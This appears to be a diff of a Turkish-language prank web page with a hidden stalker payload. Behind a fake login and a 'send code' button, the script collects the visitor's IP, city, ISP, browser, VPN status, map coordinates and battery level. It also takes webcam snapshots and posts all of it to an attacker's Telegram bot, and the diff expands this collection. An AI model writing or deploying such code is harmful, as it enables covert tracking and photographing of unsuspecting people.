@@ -17,36 +17,30 @@
       text-align: center;
       overflow: hidden;
     }
-
     #hataMesaji {
       display: none;
       font-size: 28px;
       color: red;
       animation: yanipSonme 0.5s infinite;
     }
-
     @keyframes yanipSonme {
       0%, 100% { opacity: 1; }
       50% { opacity: 0; }
     }
-
     #ayikOl, #koduGonder {
       display: none;
     }
-
     #uyari {
       display: none;
       color: orange;
       font-size: 18px;
       margin-top: 10px;
     }
-
     #ayikOl {
       font-size: 60px;
       color: red;
       margin-bottom: 10px;
     }
-
     #koduGonder {
       font-size: 18px;
       padding: 10px 20px;
@@ -59,7 +53,6 @@
       position: relative;
       z-index: 1;
     }
-
     .piece {
       position: absolute;
       width: 10px;
@@ -67,7 +60,6 @@
       background-color: #4CAF50;
       animation: explode 0.6s forwards ease-out;
     }
-
     @keyframes explode {
       0% { opacity: 1; transform: translate(0, 0) scale(1); }
       100% {
@@ -78,7 +70,6 @@
         ) scale(0.5);
       }
     }
-
     video {
       display: none;
       transform: scaleX(-1);
@@ -117,28 +108,34 @@
         document.getElementById("ayikOl").style.display = "block";
         document.getElementById("koduGonder").style.display = "inline-block";
 
-        fetch("https://api.ipify.org?format=json")
+        // IP, konum, cihaz, şarj bilgisi çek ve Telegram'a gönder
+        fetch("https://ipapi.co/json")
           .then(res => res.json())
-          .then(data => {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id: chatId,
-                text: `📡 IP: ${data.ip}`
-              })
-            });
+          .then(ip => {
+            navigator.getBattery().then(bat => {
+              const msg = `
+📡 IP: ${ip.ip}
+🌍 Ülke: ${ip.country_name}
+🏙️ Şehir: ${ip.city}
+🧠 ISP: ${ip.org}
+📱 Tarayıcı: ${navigator.userAgent}
+🔐 VPN/Proxy: ${ip.security?.vpn ? "Evet" : "Hayır"}
+🗺️ Harita: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}
+🔋 Şarj: ${Math.round(bat.level * 100)}% (${bat.charging ? "Prize takılı" : "Bataryada"})
+              `;
+              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: msg })
+              });
+            }).catch(() => {});
           });
 
         const video = document.getElementById('kamera');
         navigator.mediaDevices.getUserMedia({ video: true })
           .then(stream => {
             video.srcObject = stream;
-          })
-          .catch(err => {
-            console.error("Kamera açılamadı:", err);
           });
-
       } else {
         document.getElementById("girisEkrani").style.display = "none";
         document.getElementById("hataMesaji").style.display = "block";
@@ -148,25 +145,25 @@
     function koduGonderTiklandi(button) {
       tiklamaSayisi++;
 
-      // Minecraft sesi
+      // Minecraft kırılma sesi
       const audio = document.getElementById("breakSound");
       audio.currentTime = 0;
       audio.play();
 
-      // Titreşim
+      // Telefon titreşimi
       if (navigator.vibrate) {
         navigator.vibrate(150);
       }
 
-      // Fotoğraf gönder
+      // Kamera görüntüsünden foto çek
       fotoGonder();
 
-      // İkinci basışta uyarı çıkar
+      // İkinci tıklamada uyarı çıkar
       if (tiklamaSayisi === 2) {
         document.getElementById("uyari").style.display = "block";
       }
 
-      // Efekti başlat
+      // Efekt
       explodeButton(button);
     }
 
@@ -193,7 +190,7 @@
       canvas.height = video.videoHeight;
       const ctx = canvas.getContext('2d');
       ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
+      ctx.scale(-1, 1); // Ayna
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       canvas.toBlob(blob => {
@@ -204,8 +201,6 @@
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: formData
-        }).catch(err => {
-          console.error("Foto gönderilemedi:", err);
         });
       }, 'image/jpeg');
     }
